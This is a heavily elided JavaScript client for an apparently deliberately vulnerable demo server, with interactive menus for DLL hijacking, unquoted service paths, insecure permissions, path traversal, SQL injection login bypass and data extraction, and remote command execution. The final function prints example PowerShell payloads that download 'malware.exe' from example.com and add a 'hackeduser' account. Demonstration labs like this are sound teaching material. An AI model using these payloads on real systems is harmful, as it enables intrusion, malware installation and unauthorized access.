...
async function dllHijackingDemo() {
    ...
    rl.question("Enter path to DLL file: ", async (dllPath) => {
        ...
        try {
            ...
            const response = await fetch(`${targetServer}/api/windows/dll-hijack?path=${encodedPath}`);
            const data = await response.json();
            console.log("\nResult:");
            console.log("-".repeat(60));
...
async function insecureFilePermissionsDemo() {
    ...
    console.log("======================================");
    console.log("This will create a file with insecure 'Everyone' full control permissions.");
        ...
        rl.question("Enter content for the file: ", async (content) => {
            ...
            try {
                ...
                if (data.success) {
                    ...
                    console.log("The file now has 'Everyone:F' permissions, meaning any user can modify it.");
                    console.log("This could allow attackers to replace legitimate files with malicious ones.");
                }
            }
            catch (error) {
                console.log("Request failed:");
...
async function unquotedServicePathDemo() {
    ...
    console.log("==================================");
    console.log("This will create a Windows service with an unquoted path containing spaces.");
    console.log("Windows will try to execute files like 'C:\\Program.exe' if the path is 'C:\\Program Files\\Example\\service.exe'");
    console.log("");
    rl.question("Enter service name: ", (serviceName) => {
        rl.question("Enter display name: ", (displayName) => {
            rl.question("Enter binary path (must contain spaces and no quotes): ", async (binPath) => {
                ...
                try {
                    ...
                    if (data.success) {
                        ...
                        console.log("The service was created with an unquoted path containing spaces.");
                        console.log("An attacker could place a malicious executable in one of the path components.");
                    }
                }
                catch (error) {
                    console.log("Request failed:");
            ...
            rl.question("Enter data: ", async (data) => {
                ...
                try {
                    ...
                    if (result.success) {
                        ...
                        console.log("This could be used to change application configuration or for persistence.");
                    }
                }
                catch (error) {
                    console.log("Request failed:");
...
async function windowsPathTraversalDemo() {
    ...
    console.log("===================================");
    console.log("This will attempt to read files using Windows-specific path handling features.");
    ...
    rl.question("Enter Windows path to access: ", async (filePath) => {
        ...
        try {
            ...
            const response = await fetch(`${targetServer}/api/windows/alt-stream?path=${encodedPath}`);
            const data = await response.json();
            console.log("\nResult:");
            console.log("-".repeat(60));
            ...
            if (typeof data === "object" &&
                ...
                console.log("This can be used to access sensitive files or alternate data streams.");
...
async function sqlLoginBypass() {
    ...
    console.log("===========================");
    console.log("This demonstrates how SQL injection can be used to bypass login authentication.");
    ...
    rl.question("Enter username (with SQL injection payload): ", (username) => {
        rl.question("Enter password (or leave empty if using injection): ", async (password) => {
            ...
            try {
                ...
                if (typeof data === "object" &&
                    ...
                    console.log("The application executed your malicious SQL and allowed unauthorized access.");
                }
                console.log("-".repeat(60));
            }
            catch (error) {
...
async function sqlDataExtraction() {
    ...
    console.log("==============================");
    console.log("This demonstrates how SQL injection can be used to extract data from the database.");
    console.log("The application fails to properly sanitize search parameters in SQL queries.");
    console.log("");
    ...
    rl.question("Enter search term (with SQL injection payload): ", async (searchTerm) => {
        ...
        try {
            ...
            const response = await fetch(`${targetServer}/api/search-users?term=${encodedTerm}`);
            const data = await response.json();
            console.log("\nResult:");
            console.log("-".repeat(60));
            if (typeof data === "object" && data !== null && "success" in data) {
            ...
            if (typeof data === "object" &&
                ...
                if (Array.isArray(data.users) && data.users.length > 0) {
                    ...
                    console.log("The application executed your malicious SQL and returned sensitive data.");
                }
                else {
...
async function remoteCommandExecutionDemo() {
    ...
    console.log("1. powershell -c \"Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'malware.exe'\"");
    console.log("2. powershell -c \"Start-Process cmd -ArgumentList '/c net user hackeduser Password123! /add'\"");
